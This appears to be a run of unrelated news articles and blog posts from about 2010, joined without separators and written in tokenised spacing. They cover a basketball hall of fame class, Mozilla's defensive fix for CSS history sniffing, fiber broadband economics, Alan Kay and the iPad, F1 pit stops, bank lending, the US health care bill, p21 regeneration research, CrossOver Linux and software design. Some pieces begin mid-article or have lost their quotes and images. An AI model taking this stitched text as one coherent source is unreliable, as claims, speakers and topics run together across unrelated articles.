" It 's crazy , but I do n't mind it .
It 's better than ' how 's the weather up there ? ' "
Laettner joined UCLA star Sidney Wicks , West Virginia sharpshooter Jerry West and high - flying North Carolina State All - American David Thompson among the eight members of the National Collegiate Basketball Hall of Fame 's 2010 class announced on Wednesday .
Triangle offense innovator Tex Winter , Alcorn State coach Davey Whitney , NCAA executive vice president Tom Jernstedt and former Big Eight and Big Ten commissioner Wayne Duke also will be inducted on Nov. 21 in Kansas City .
" What an amazing class , " said Duke coach Mike Krzyzewski , chair the National Association of Basketball Coaches .
West and Thompson are the marquee names .
They 'll be recognized as founding members of the collegiate hall after being inducted into the Naismith Memorial Basketball Hall of Fame .
Previous founding members of the collegiate hall include Larry Bird and Magic Johnson last year , Charles Barkley the year before and Kareem Abdul - Jabbar in 2007 .
Before he became the figure in the NBA logo , West was a three - time All - American at West Virginia , where he led the Mountaineers to three straight NCAA tournament berths , including a trip to the 1959 title game .
He averaged 29.3 points and 16.5 rebounds as a senior and went on to co-captain the 1960 U.S. Olympic gold medal team before 14 All - Star seasons with the Los Angeles Lakers .
Thompson was one of the best college players of all time , a superb leaper and shooter who was twice the national player of the year and a three - time All - American .
He helped the Wolfpack beat John Wooden 's dynastic UCLA Bruins in the national semifinals on the way to the 1974 NCAA championship and was the Naismith player of the year as a senior after turning down an offer to play professionally .
" There 's an argument that he may be the best college player ever , " Krzyzewski said .
" Certainly , in our conference , many , many people would give him that vote . "
Laettner led the Blue Devils to four straight Final Four berths and won national championships his final two seasons , in 1991 and 1992 .
He was the most outstanding player of the Final Four as a junior and the national player of the year as a senior , when he hit that shot against Kentucky .
Wicks played on three of Wooden 's national championship teams at UCLA ( 1969 - 71 ) and was named most outstanding player of the Final Four as a junior .
The 6 - foot - 8 forward led the Bruins in scoring and rebounding each of his final two years and went on to play 10 seasons in the NBA .
Winter is credited with creating the triangle offense that has helped Phil Jackson win 10 NBA titles with the Chicago Bulls and Los Angeles Lakers .
Before that , Winter coached five college programs , including a 15 - year stint at Kansas State , where he was named the national coach of the year in 1959 .
Whitney , a former Negro Leagues baseball player , won 711 games in 35 years as a coach , including 27 at Alcorn State .
He led the school to a berth in the 1979 NIT , making it one of the first historically black colleges to receive an invite , and took the Braves to the NCAA tournament four times .
" In Dave Whitney and Tex Winter , you have two coaches who have contributed so much to the game , " Krzyzewski said .
Duke was the first employee hired by NCAA executive director Walter Byers in 1952 and wrote the first manuals for the basketball tournament and College World Series .
He also began compilation of the NCAA record books and served as a member of the NCAA men's basketball committee from 1975 - 81 , when the tournament expanded twice .
Jernstedt joined the NCAA 38 years ago , first as director of special events , later as chief operating officer and currently serves as the executive vice president .
He was instrumental in the NCAA tournament expanding its field , size and scope of venues and revenues from marketing and broadcast rights .
Privacy is n’t always easy .
We ’re close to landing some changes in the Firefox development tree that will fix a privacy leak that browsers have been struggling with for some time .
We ’re really excited about this fix , we hope other browsers will follow suit .
It ’s a tough problem to fix , though , so I ’d like to describe how we ended up with this approach .
History Sniffing
Links can look different on web sites based on whether or not you ’ve visited the page they reference .
You ’ve probably seen this before : in some cases , visited links are purple instead of blue .
This is just one of the many features web designers use to make the web the best it can be , and for the most part that ’s a good thing .
The problem is that appearance can be detected by the page showing you links , cluing the page into which of the presented pages you ’ve been to .
The result : not only can you see where you ’ve been , but so can the web site !
Originally specified as a useful feature for the Web , visited link styling has been part of the web for … well , forever .
So this is a pretty old problem , and resurfaces every once in a while to generate more paranoid netizens .
The most obvious fix is to disable different styles for visited versus unvisted links , but this would be employed at the expense of utility : while sites can no longer figure out which links you ’ve clicked , neither can you .
David Baron has implemented a way to help keep users ’ data private while minimizing the effect on the web , and we are deploying it to protect our users .
We think this represents the best solution to the problem , and we ’ll be delighted if other browsers approach this the same way .
Technical Details .
The biggest threats here are the high - bandwidth techniques , or those that extract lots of information from users ’ browsers quickly .
These are particularly worrisome since they enable not only very focused attacks , but also the widespread brute - force attacks that are , in general , more useful to a variety of attackers ( potentially including fingerprinting ) .
The JavaScript function getComputedStyle ( ) and its related functions are fast and can be used to guess visitedness at hundreds of thousands of links per minute .
To make it harder for web sites to figure out where you ’ve been without radically changing the web , we ’re approaching the way we style links in three fairly subtle ways :
Change 1 : Layout - Based Attacks
First of all , we ’re limiting what types of styling can be done to visited links to differentiate them from unvisited links .
Visited links can only be different in color : foreground , background , outline , border , SVG stroke and fill colors .
All other style changes either leak the visitedness of the link by loading a resource or changing position or size of the styled content in the document , which can be detected and used to identify visited links .
While we are changing what is allowed in CSS , the CSS 2.1 specification takes into consideration how visited links can be abused :
“ UAs may therefore treat all links as unvisited links , or implement other measures to preserve the user ’s privacy while rendering visited and unvisited links differently . ”
[ CSS 2 Specification ]
Change 2 : Some Timing Attacks
Next , we are changing some of the guts of our layout engine to provide a fairly uniform flow of execution to minimize differences in layout time for visited and unvisited links .
The changes cause all styles to be resolved on all links for both visited and unvisited states , and it is stored ; then , when the link is styled , the appropriate set of styles is chosen making the code paths for visited and unvisited links essentially the same length .
This should eliminate some of the easy - to - mount timing attacks .
Change 3 : Computed Style Attacks
JavaScript is not going to have access to the same style data it used to .
When a web page tries to get the computed style of a link ( or any of its sub-elements ) , Firefox will give it unvisited style values .
What does this mean for users ?
For the most part , users should n’t notice a change in how the web works .
A few web sites may look a little different , but visited links will still show up differently colored .
A few sites that use more than color to differentiate visited links may look slightly broken at first while they adjust to these changes , but we think it ’s the right trade - off to be sure we protect our users ’ privacy .
This is a troubling and well - understood attack ; as much as we hate to break any portion of the web , we need to shut the attack down to the extent we can .
We have to be realistic , though : there are many ways all browsers leak information about you , and fixing CSS history sniffing will not block all of these leaks .
But we believe it ’s important to stop the scariest , most effective history attacks any way we can since it will be a big win for users ’ privacy .
If the remaining attacks worry you , or you ca n’t wait for us to ship this fix , version 3.5 and newer versions of Firefox already allow you to disable all visited styling ( immediately stops this attack ) by setting the layout.css.visited_links_enabled option in about : config to false .
While this will plug the history leak , you ’ll no longer see any visited styling anywhere .
Enhancing Privacy on the Web .
We want to bridge the gap between our users ’ expectations of privacy and what actually happens on the web .
Sometimes users have an expectation that we preserve their privacy a certain way , and if we can , we want to live up to it .
Privacy is n’t a feature that can simply be added to a browser , though ; it often comes at the expense of utility .
We think we ’ve found a fix that will balance flexibility for web developers while providing a safer experience for our users on the web .

Lately the word " fiber " has started to become ubiquitous in advertisements for broadband .
It ’s a synonym for the future , for speed and quality .
Everybody tries to connect that synonym to their brand , regardless of their actual network design .
In the trade press , acronyms like FttX ( which stands for Fiber - to - the - X , where X is your favorite letter or word ) are used as if all last mile network architectures with optical fiber are more or less equal .
But they 're not .
Let ’s take a look under the hood and analyze the reasons why fiber is chosen as a medium , then look at the topologies , the architectures , the trade - offs , and the inherent path dependencies of a particular deployment method .
Fiber - to - the - curb , fiber - to - the - basement , fiber - to - the - home — truly , not all fiber is created equal .
Getting fiber closer to the home
In 1965 , Charles K. Kao and George A. Hockham of the British company Standard Telephones and Cables realized that optical fiber could be of practical use for telecommunications , and since that date fiber has become the medium of choice .
First it was used for the core networks over long distances ; as time progressed , it was laid deeper and wider in all networks up to last - mile access networks .
The reason for fiber 's popularity is simple : fiber is very reliable and many orders of magnitude better than anything else for the same price .
What makes it a winner is its combination of low attenuation of very high frequencies and very low noise — the key factors that determine how much and how fast information can be transmitted over a distance .
Scientists use the formula of bandwidth multiplied by distance as an indicator of line quality , with the record in 2009 surpassing 19 petabytes ( that 's 19 million gigabytes or 152 million gigabits ) per second per kilometer , over one fiber .
And yes , Moore ’s law has an analogue in fiber optics transmission equipment : every 18 months , you get roughly double the capacity for the same price .
Coaxial cable was a great improvement over copper wires in the 19th century , but fiber beats both of them handily .
The more information you want to transmit , the more pronounced fiber 's advantage .
As the appetite for communication capacity to each home grew in the last decade , the limitations of the existing access networks became visible .
This happened first of all in the copper wires originally deployed for telephony , then in the shared coax networks deployed for cable TV .
Clever engineering is used to squeeze out all available capacity of such systems , but the writing is on the wall : we need fiber closer to the home .
Ninety - nine percent of the Internet 's physical distance has been strung with fiber already ; just a minor hop , and home and business users can have a fully fiber connection .
The obvious question is , why has fiber been rolled out in globe - spanning networks without any public discussion whatsoever , while deploying fiber in the last mile is a huge deal ?
The answer is two - fold : money , and natural monopolies .
Utility infrastructure law : " it 's the backhoe , stupid "
A Utility Infrastructure Law commonly quoted by engineers says , " The closer you get to the home , the more investment is needed , averaged per home connected . "
This law applies to all parts of the physical network , like water pipes , sewage pipes , and electricity cables .
What are the applicable numbers for telecom cables ?
A useful division of communication networks is between core networks ( deep sea intercontinental , international , or core networks countrywide between exchanges ) , backhaul and middle - mile networks ( from exchanges to local aggregation points ) , and access networks ( from homes to local aggregation points ) .
A quick , back - of - the - envelope calculation based on expert estimates indicates a relative investment level of 1:3:10 for core : middle : access networks , proving the Utility Infrastructure Law .
There are roughly 500 million broadband connections in the world right now , and they rely on core networks with an estimated aggregate investment level of € 40 - 50 billion ( US $ 54 - 67 billion ) , or approximately € 100 ( $ 134 ) per connection .
The numbers for middle - mile and backhaul networks are not public , but some reference points can be inferred .
In the Netherlands , 6 million connections are served with an estimated investment of approximately 1.5 billion euro ( $ 2 billion ) , an average of less than 300 euro ( $ 403 ) per connection .
In the US , there currently are 85 million broadband connections .
An average of 300 euro per connection would mean an aggregated investment of 25 billion euro ( $ 34 billion ) .
At $ 40 per meter , you could deploy approximately 1 million kilometers of backhaul , the combined length of all state highways in the USA .
So 300 euro or less per connection seems like a good estimate .
The investment per connection of a full fiber access line to the home replacing all copper or coax is between 850 and 1100 Euro ( 1,143 - 1,479 USD ) in the Netherlands , all - included .
The equivalent number in the USA as quoted by Verizon is in the same ballpark per home connected .
But would n’t the investment level of the access line be elevated by the fact that fiber cabling is used ?
That appears to be not the case .
The investment in access infrastructure , i.e. , stringing or digging new cables , consists mainly of labor , not materials ( exceptional conditions excluded ) .
In dense cities , the bill of materials is as low as 20 percent .
The cost of labor per meter exceeds by far the cost of a fiber cable or a coaxial cable per meter .
Deploying fiber or coax or copper wires would not make much of a difference .
The phrase “ it ’s the backhoe , stupid ” even applies in areas like Uganda .
The equivalent normalized costs of laying the existing copper or coax network in current purchasing power substantiate the Utility Infrastructure Law .
The fact that 90 percent of the population lives in relatively dense areas ( cities , suburbs , towns ) helps .
Incremental versus sunk costs
The last mile access line is the biggest part of the per-home average investment in the network .
On a per-home basis the absolute level of investment is n’t that impressive relative to other investments ( two iPhones ?
A 50 - inch HDTV ?
A front door ? )
The useful life of a fiber access line probably exceeds 40 years , but the multiplier of the total number of homes makes it a sizable overall investment — much larger than investments in other parts of the network .
To make matters worse , there is a major difference between core / middle - mile and access networks .
Middle - mile and core networks are generally shared between many customers , so capacity can be reallocated .
These shared networks can be incrementally extended and increased in capacity as demand grows .
Moore ’s law helps as well ; the fact that the increase in capacity per dollar invested in transmission electronics doubles every 18 months already covers a large part of the yearly increase in traffic for middle - mile and core networks .
But for a last - mile access line , in contrast , there is only one potential customer : the occupant of the home .
The majority of the cash outlay goes to laying the access line , and it 's all sunk costs .
The investment can only be recovered for a minor part of the project ( the last drop ) , and then only the first time out — you do n’t remove the last drop even if the customer quits paying you for services .
It is not possible to reallocate that access line investment to another potential customer , so that line either pays for itself or it does n't .
( Note : electronics are excluded in this analysis , because the gear can be deployed and reallocated as penetration grows ) .
The maintenance costs of a fiber line are very low .
Verizon estimates that the difference in maintenance costs between a copper line and a fiber line , expressed in a Net Present Value of all future gains , exceeds $ 200 per connection .
Utilization is key
The investment in access infrastructure , i.e. , stringing or digging new cables , consists mainly of labor , not materials .
The net effect of the dynamic outlined above is that penetration levels in access networks are critical to making money with fiber , as Benoît Felten repeatedly demonstrates in his presentations .
The level of penetration has such a financial impact on the cost price per active connection that an ISP can't really offset that impact by having a more efficient operation in the rest of the value chain .
A 20 percent relative variation in penetration can lead to a difference in cost price per connection of $ 10 or more per month .
Given the fact that almost all costs in the access network are sunk , it is hard to envision two or more new fiber access networks being deployed in parallel to each home , leading to a stable competitive environment over time .
( Unless the ISP ’s or network 's owners are allowed to divide the market and raise prices to compensate for the underutilization of the networks ) .
If the medium is no longer limited and the access network is the expensive part of the investment , why duplicate the cables ?
We not do duplicate cables for electricity or other utilities either , for the same reasons .
Note that the current competition between the two wired communication infrastructures to the home — cable and telephone — is a historical accident .
Both networks were built for and financed by services that were originally mutually exclusive ( telephony and TV ) .
Providers of each these services financed each access network , with relatively high utilization rates .
The much later discovery that each network type could unexpectedly deliver packets of information to the home for some new newfangled thing called the Internet , and that users were willing to pay for that new service , was a stroke of luck .
But now , with VoIP and IPTV , utilization is a major factor , and the sell - off of older , underutilized parts of the access network and investment in new networks has started .
It remains to be seen what models will emerge where .
The European trend is to strive for unbundling and sharing of at least pieces of the new access network ( France , Portugal ) , if not the complete access network ( Netherlands , Switzerland ) .
This gets utilization ratios up and average costs down .
The US , in contrast , has chosen up to now a competition between networks .
So if fiber - to - the - home is a relatively large investment , most of it up - front with an expected lifetime of many decades , and if utilization ratios are the key to fiber 's financial success , then it makes sense to look hard at architectures and path dependencies .
The risk of premature technical obsolescence or a lock - in that would require new investments should be reduced , or at least weighed in the decisions .

He was right .
His Dynabook design was the first laptop and tablet concept ever .
And his idea of always - connected mobile computing is exactly what we have today .
Not only he came up with these ideas out of nowhere , but he was also responsible for the overlapping windowing graphical user interface of the Alto .
That GUI was the base for the Macintosh , and all the computer user interfaces we use today — except for our iPhones and Androids .
Or the iPad , when it comes out .
Lately , however , Kay does n't seem to love the windowing GUI concept as much as he did back in the 80s , when the Macintosh came out .
This is what he said to Om Malik in a recent interview , before the iPad was introduced :
When the Mac first came out , Newsweek asked me what I [ thought ] of it .
I said : Well , it 's the first personal computer worth criticizing .
So at the end of the presentation , Steve came up to me and said :
Is the iPhone worth criticizing ?
And I said :
Make the screen five inches by eight inches , and you 'll rule the world .

I did n't see the quote back then , but his judgement seems to me spot on .
The quote was in a presentation by Evan Doll , from his class at Stanford about designing user interfaces for the iPad .
In that slide , Doll quotes Kay , listing then why the iPad 's user interface will change computing as we know it ( something that I also said before it came out .
Obviously the magic rainbow pills are working ) .

It 's an interesting slideshow , even without his oral explanations , which covers how the " gulf of knowledge " is making many so - called experts ignore the extreme complexity of computers today , and also ignore why the iPad is the computing device for 95 % of the population .
Doll makes a great case for this , pointing out the uses of the iPad , and where it would fit in our daily lives — including the inevitable toilet factor :

Beyond Doll 's rationale , however , I find particularly interesting that Kay — the guy who invented mobile computing and the windowing interface — is now behind the idea of a modal , always - connected tablet .
Hopefully , he will be right as he was with the Dynabook .

Jenson Button 's rivals are sending their mechanics to train with Olympians in a bid to stop him winning the world championship again .
Red Bull Racing 's 18 - man pit crew drive 60 miles to the Bisham Abbey facilities in Buckinghamshire , also used by England 's football and rugby teams , to get in top shape for the coming season which starts a week today in Bahrain .
The plan is paying off , with the Milton Keynes outfit stripping their time for changing all four tyres to a lightning 1.8 seconds .
With the banning of refuelling , and at least eight drivers in with a chance of winning the title , pit stops will be crucial this season .
And the new rules have even triggered a race between teams forking out £ 500,000 over the season to ensure the pit -stop equipment is the lightest and best available .
" The guys have trained like hell over the winter , " said Red Bull boss Christian Horner .
" Bisham Abbey has proved great .
" We have even changed the crew around quite a lot to get the right guys in the right place because some are better than others at using the gun or changing tyres .
" They have all lost weight and got fitter in the process .
The guys have been training in the gym at 12 and 4 pm every day since November .
" We have done sub - two second stops .
They are absolutely lightning .
" We 've always been fast but now there 's been a lot more of a scientific approach to the whole issue . "
It was clear that readers showing up for our live blog of the Activision Blizzard earnings call were interested in one thing : when the closed beta for StarCraft 2 was set to begin .
It took a while to get there , but we were provided a solid answer .
The beta will begin before the end of the month , with the game itself set for release in the middle of 2010 .
Amidst all the electronic cheers , a few details on the updated Battle .
net were also announced to compliment the tour given to gamers via the official site .
Battle .net will be the place to play and experience all Blizzard games , giving gamers the ability to speak to each other across both World of WarCraft realms and even other games .
If you 're playing StarCraft 2 and your friends are in the middle of a raid , you 'll be able to speak to each other .
It will also be the place to buy games and add - on content for Blizzard releases ; Activision has made clear its lust for higher digital profits .
" Thousands " of players will be given access to the beta , across North America , Australia , Taiwan , Europe , New Zealand , and Korea .
The beta will be used to generate buzz for the game 's release , and of course to test all the new features of the updated Battle .

A steep yield curve should mean fat profits for banks .
It has n’t .
Unable to find qualified borrowers and worried that interest rates have nowhere to go but up , banks are stockpiling cash and securities while letting loans dwindle .
It turns out banks wo n’t lend till rates rise .
The trouble is , if rates rise their capital will take another hit , leaving them little to support new lending .
The yield curve is a proxy for the difference between short - term rates at which banks borrow and long - term rates at which they lend .
In theory , a “ steeper ” curve means a wider profit margin .
As the following chart shows , bank profit margins are n’t keeping pace with the steepness of the curve .
( Click here to enlarge chart in new window )
Why not ?
One issue is that banks are n’t lending .
You ca n’t make money borrowing short if you ’re not willing to lend long .
Indeed , banks are shrinking their loan books while socking away cash :
( Click here to enlarge chart in new window )
Why do this ?
Cash is more liquid than loans , of course , so higher balances protect banks from the volatility of credit markets .
Also , it prepares them for stricter liquidity requirements coming from regulators .
The fall in lending is more controversial , but banks are absolutely right to be curtailing loans .
One reason , 10 % unemployment means a dearth of credit - worthy borrowers .
Another important one : Rates have nowhere to go but up .
A bank originating a new 30 - year mortgage at 5.3 % is taking significant interest rate risk .
Remember , the bank has to borrow short to fund the mortgage , by selling CDs for instance .
One year CDs average 1.6 % according to Bankrate .
Because rates ca n’t go lower , deposits are likely to get more expensive over the 30 - year life of the mortgage .
What looks like a healthy interest rate spread today ( 5.3 % – 1.6 % = 3.7 % ) is going to tighten .
The risk involved in originating new mortgages is a big reason the vast majority are now purchased or backed by Fannie , Freddie or FHA .
Instead of loans , banks have been plowing assets into more liquid securities according to Paul Miller of FBR Research .
But as credit markets have healed , the interest rate spread on these assets have also come down , limiting profit potential .*
When will banks lend again ?
Miller argues that “ for any meaningful margin expansion … the Fed needs to raise rates . ”
The yield curve may be steep , but it ’s steep at low rates .
Banks can’t capture the whole spread because they have to pay significantly more for deposits than the Fed funds rate of 0 - 0.25 % .
To make money , banks need to lend at higher rates .
Also many carry floating assets – credit card and corporate loans , ARMs – that key off indices like LIBOR .
A Fed hike would instantly improve their yield .
Trouble is higher rates mean lower real estate prices and higher default rates , which will continue to bleed bank capital .
It ’s a troubling paradox : Banks ca n’t make money on new lending without higher rates , but higher rates will increase credit losses on old legacy loans .
It ’s another reason the Fed is stuck .

Cook defends fried chicken choice for Black History Month menu
It may have seemed like an innocent tweet .
But when you have more than a million followers , it ’s never that simple .
Questlove , the drummer for the Roots – now the house band for The Jimmy Fallon Show – was grabbing a bite at the NBC commissary Thursday , when a certain lunch special caught his eye .
He snapped a photo of the sign , and tweeted it .
Underneath the picture he included the caption “ Hmm HR ? ” – signaling that he may have been offended by the idea that Black History Month should be honored with fried chicken and collard greens .
Some of his 1.3 million followers agreed , posting comments like “ They wrong … Somebody get Al Sharpton on the phone ” – while others did n’t see the big deal , writing “ It is a representation of Black food historically . ”
Within minutes the sign was gone from the commissary – though the meal continued to be served – and NBC posted a tweet of their own , saying “ The sign in the NBCU cafeteria has been removed .
We apologize for anyone who was offended by it . ”
One person who does n’t understand how offense could be taken : Chef Leslie Calhoun .
It was her decision to select the menu items and create the sign .
The Grio caught up with her minutes after the tweet fiasco erupted and she seemed genuinely upset by the whole thing .
Calhoun is an African - American and employee of Flick , a catering service that runs the NBC commissary .
She said that for the last eight years she ’s been seeking approval from Flick management for a special Black History Month menu , and had finally been told that every Thursday for the month of February , she could serve whatever she chose .

“ I do n’t understand at all .
It ’s not trying to offend anybody and it ’s not trying to suggest that that ’s all that African - Americans eat .
It ’s just a good meal , ” she said , adding , “ I thought it would go over well . ”
As for Questlove , he ’s opted to give tweeting a break .
About two hours after posting his twitpic , he typed “ i think I need a twitter break .
i done started something .
and now I must put out fire . ”
Looks like for now , he ’ll go back to using his fingers for drumming .
This is n’t the first time this year that fried chicken and collard greens on a menu have created a stir .
Last month , Denver Public Schools experienced a backlash after announcing they would serve fried chicken and collard greens in honor of Dr. Martin Luther King , Jr .

President Barack Obama 's sweeping health care legislation won precious support from a longtime liberal holdout in the House on Wednesday and from Catholic nuns representing dozens of religious orders , gaining fresh traction in the run-up to a climactic weekend vote .
" It 's a good sign , " said Obama , two weeks after taking personal command of a campaign to enact legislation in what has become a virtual vote of confidence in his still - young presidency .
After days of secretive meetings , Democratic officials said they hoped to release the wording of the final legislation within hours , pending final cost and deficit - reduction estimates from the Congressional Budget Office .
The long - anticipated measure is actually the second of two bills that Obama hopes lawmakers will send him in coming days , more than a year after he urged Congress to remake the nation 's health care system .
The first cleared the Senate late last year but went no further because House Democrats demanded significant changes — the very types of revisions now being packaged into the second bill .
Together , the measures are designed to extend coverage to more than 30 million who now lack it and ban the insurance industry from denying coverage on the basis of pre-existing medical conditions .
Obama also has asked lawmakers to slow the growth of medical spending generally , a far more difficult goal to achieve .
Rep. Dennis Kucinich 's announcement in the Capitol made him the first Democrat to declare he would vote in favor of the legislation after voting against an earlier version , and he stressed he was still dissatisfied with key parts .
" I know I have to make a decision , not on the bill as I would like to see it but as it is , " said the Ohio lawmaker , who twice ran for president advocating national health care .
" If my vote is to be counted , let it now count for passage of the bill , hopefully in the direction of comprehensive health care reform . "
Referring to the political struggle under way , Kucinich said , " You do have to be very careful that the potential of President Obama 's presidency not be destroyed by this debate .
Even though I have many differences with him on policy , there 's something much bigger at stake here for America . "
Obama lobbied Kucinich heavily for his vote , including aboard Air Force
One earlier in the week on a trip to northeastern Ohio for a presidential speech .
House Speaker Nancy Pelosi , D - Calif. , said Kucinich 's switch was important not only for itself , " but also on the outside , " with liberal groups still unhappy the bill does n't create a government - run insurance option .
Republicans are opposed to the legislation , arguing it still amounts to a government takeover of health care , largely paid for through higher taxes and deep cuts in Medicare that will harm seniors .
In recent days , they have also turned their criticism on Pelosi , who says the House may approve the Senate - passed bill without casting a separate vote on it .
Instead , under a rule that would itself be subject to a vote , it would be considered passed automatically if the second fix - it bill passed .
This approach has been used numerous times in recent years by both political parties , but Republicans added it to their list of grievances as they sought to send Obama 's top domestic priority down to defeat .
" The only way to stop this madness is for a few courageous Democrats to step forward and stop it , " said Sen .
Mitch McConnell of Kentucky , the Senate GOP leader .
" Historians will remember this as a new low in this debate , the week that America was introduced to the scheme - and - deem approach to legislating .
They 'll remember this as the week that Congress tried to pull the wool over the eyes of the public in order to get around their will . "
Without disclosing details , Democrats say the fix - it bill would add funds to federal subsidies designed to make health care more affordable for the working poor and middle class , to benefit states that already meet standards the bill sets for health care for the poor and to gradually close a gap in Medicare prescription drug coverage known as the doughnut hole .
The revisions are also expected to repeal a Nebraska - only increase in federal Medicaid funds that cleared the Senate , a provision that became politically toxic as news of it spread last year .
Shortly after Kucinich 's announcement , a letter was released from leaders of 60 women 's religious orders urging lawmakers to vote for the legislation .
" Despite false claims to the contrary , the Senate bill will not provide taxpayer funding for elective abortions .
It will uphold long - standing conscience protections and it will make historic new investments — $ 250 million — in support of pregnant women , " wrote the nuns , in a letter released by Network , A National Catholic Social Justice Lobby .
" This is the REAL pro-life stance , and we as Catholics are all for it . "
The endorsement reflected a division within the church .
The U.S. Conference of Catholic Bishops opposes the Senate - passed legislation , contending it would , in fact , permit the use of federal funds for elective abortions .
The abortion issue has long split Democrats , 40 of whom voted for an earlier House bill only after it was changed at the last minute to stiffen restrictions on the availability of abortions under a new insurance marketplace that would be established under the bill .
Rep. Bart Stupak of Michigan , a leader of the anti-abortion Democrats , has said at least a dozen of the 40 intend to oppose the bill — and Rep. Steven Driehaus of Ohio announced through an aide he intends to be among them .
The first - term lawmaker faces a difficult re-election race next fall against the man he defeated in 2008 .
So far , three of the 40 , Reps .
Dale Kildee of Michigan ; James Oberstar of Minnesota and Richard Neal of Massachusetts , have said they intend to support the legislation in the next vote .
The original House bill banned health plans receiving government subsidies from covering abortion , except in cases of rape , incest or to save the life of the mother .
Women who wanted insurance coverage for abortion would have to buy a separate policy .
Unlike the House bill , the Senate - passed measure would allow insurance plans to cover abortions provided consumers paid separately from the rest of their coverage .
A woman who wants coverage for abortion would have to write two checks to her health insurance plan .
Because of complex parliamentary rules in the Senate , Democrats have concluded they cannot use the fix - it bill to make changes in the abortion provision , leaving anti-abortion lawmakers with a take - it - or - leave - it choice .

Human regeneration has to date been the preserve of science fiction .
But mammals may have a dormant ability to regrow healthy tissue , research suggests , possibly paving the way for scar - free healing at some point in the future .
Biologists believe that a gene called p21 may hold the key to spontaneous healing , which could allow limited regeneration of the human body , as witnessed in newts , flatworms and the hydra .
It is thought that in mammals this healing potential has been lost through evolution , but may lie dormant in cells and could be reactivated by switching off the p21 gene .
Mice engineered in the laboratory to lack the p21 gene , were able to renew surgically removed tissue so that no trace of an injury remained .
Removing p21 causes adult cells to behave like stem cells – those cells in embryos with a " pluripotent " power to become any kind of tissue .
In experiments , mice which were missing the gene had holes punched into their ears ( as commonly done to identify lab animals ) , but after a few weeks all traces of the ear holes had disappeared .
" Much like a newt that has lost a limb , these mice will replace missing or damaged tissue with healthy tissue that lacks any sign of scarring , said Ellen Heber - Katz , a professor at the Wistar Institute in Philadelphia , who led the study .
" While we are just beginning to understand the repercussions of these findings , perhaps one day we 'll be able to accelerate healing in humans by temporarily inactivating the p21 gene . "
This gene is tightly controlled by another gene , p53 , which is a well - known cell division regulator and tumour suppressor .
Defective p53 can lead to many types of cancer .
In normal adult cells , p21 acts as an anti-cancer safety mechanism , blocking out cell division in the event of DNA damage , said the biologists .
So , mice lacking p21 might be expected to suffer worsening damage to DNA , and eventually cancer .
But , while increased DNA damage was observed in experimental mice , there was no cancer surge , according to a report of the research published in the journal Proceedings of the National Academy of Sciences .
Instead there was an increase in " cell suicide " , or apoptosis , a cancer - blocking mechanism that directs dysfunctional cells to kill themselves .
" The combined effects of an increase in highly regenerative cells and apoptosis may allow the cells of these organisms to divide rapidly without going out of control and becoming cancerous , " said Prof Heber - Katz .

Some Linux users insist that anything you can do on Windows , you can do better on Linux .
While there 's some truth to that , many of us have Windows applications that make completely leaving Windows close to impossible .
That 's where CodeWeavers ' latest version of CrossOver Linux comes in .
CrossOver Linux 9 ( code - named Snow Mallard ) and its Mac brother , CrossOver Mac 9 , let you run many popular Windows applications on Linux or Mac OS X. Supported Windows applications include Microsoft Office ( from Office 97 to Office 2007 ) , Internet Explorer 6 and 7 , Outlook 2002 to 2007 , all current versions of Quicken up to 2010 and QuickBooks up to 2004 , and some versions of Photoshop and Photoshop CS .
Based on my experience with CrossOver , which goes back more than a decade , I 'd say this new version supports about 20 % more applications ( at a level that most users would find usable ) than the last one .
CrossOver is based on the open - source project Wine , an implementation of the Windows API on top of the Unix / Linux operating system family .
Wine is a mature project involving almost 17 years of work to get Windows applications to run on Unix and Linux systems .
Actually , you do n't need CrossOver Linux to run Windows applications on Linux .
You can do it with Wine alone -- if you know exactly what you 're doing .
What CrossOver brings to the table is automated installation of Windows applications , and technical support .
And in this latest version , the CrossOver interface has been improved so it 's easier than ever to install and manage Windows applications .
Installing CrossOver
To see how well CrossOver Linux 9 does its job , I tested it on two systems .
The first was a Dell Inspiron 530S powered by a 2.2 - GHz Intel Pentium E2200 dual - core processor with an 800 - MHz front - side bus .
The machine had 4GB of RAM , a 500GB SATA drive and an integrated Intel 3100 GMA chip set .
It was running the Debian - based MEPIS 8 desktop Linux distribution .
Installing Windows applications in the new CrossOver is as easy as pick and click .
I also tried CrossOver 9 on an older Gateway 503GR with a 3 - GHz Pentium 4 CPU , 2GB of RAM , an ATI Radeon 250 graphics card and a 300 GB SATA drive .
It was running Ubuntu 9.10 .
Both systems had more than enough horsepower to run multiple Windows and Linux applications simultaneously .
In fact , CodeWeavers claims that any 32 - bit system that runs at 200 MHz can run CrossOver .
( The program will run on a 64 - bit system , but only if it has the 32 - bit compatibility library installed .
So even the 64 - bit version is really a 32 - bit application platform . )
CrossOver also requires that your Linux include Glibc 2.3.x or greater and X11R6 3.3 or greater .
XFree86 4 with XRender and FreeType support is recommended .
In short , CrossOver will run on any modern Linux distro on almost any PC .
I did n't write this comment on the blog entry Wa :
The key to clear , harmonious design :
I know that you are talking about visual design , but I am struck by how this approach applies to many other domains .
But I could have .
I started university life intending to become an architect , and my interest in visual design has remained strong through the years .
I was delighted when I learned of Christopher Alexander 's influence on some in the software world , because it gave me more opportunities to read and think about architectural design -- and to think about how its ideas relate to how we design software .
I am quite interested in the notion that there are universal truths about design , and even if not what we can learn from designers in other disciplines .
Garr Reynolds identifies seven principles of the Zen aesthetic of harmony .
Like the commenter , my thoughts turned quickly from the visual world to another domain .
For me , the domain is software .
How well do these principles of harmony apply to software ?
Several are staples of software design .
Others require more thought .
(1) Embrace economy of materials and means
(3) Keep things clean and clutter - free
These are no -brainers .
Programmers want to keep their code clean , and most prefer an economical style , even when using a language that requires more overhead than they would like .
(6) Think not only of yourself , but of the other ( e.g. , the viewer ) .
When we develop software , we have several kinds of others to consider .
The most obvious are our users .
We have disciplines , such as human - computer interaction , and development styles , such as user - centered design , focused squarely on the people who will use our programs .
We also need to think of other programmers .
These are the people who will read our code .
Software usually spends much more time in maintenance than in creation , so readability pays off in a huge way over time .
We can help our readers by writing good documentation , an essential complement to our programs .
However , the best way to help our readers is to write readable code .
In this we are more like Reynolds 's presenters .
We need to focus on the clarity and beauty of our primary product .
Finally , let 's not forget our customers and our clients , the people who pay us to write software .
To me , one of the most encouraging contributions of XP was its emphasis on delivering tangible value to our customers every day .
(7) Remain humble and modest .
This is not technical advice .
It is human advice .
And I think it is underrated in too many contexts .
I have worked with programmers who were not humble enough .
Sadly , I have been that programmer , too .
A lack of humility almost always hurts the project and the team .
Reynolds is right in saying that true confidence follows from humility and modesty .
Without humility , a programmer is prone to drift into arrogance , and arrogance is more dangerous than incompetence .
A programmer needs to balance humility against gumption , the hubris that empowers us to tackle problems which seem insurmountable .
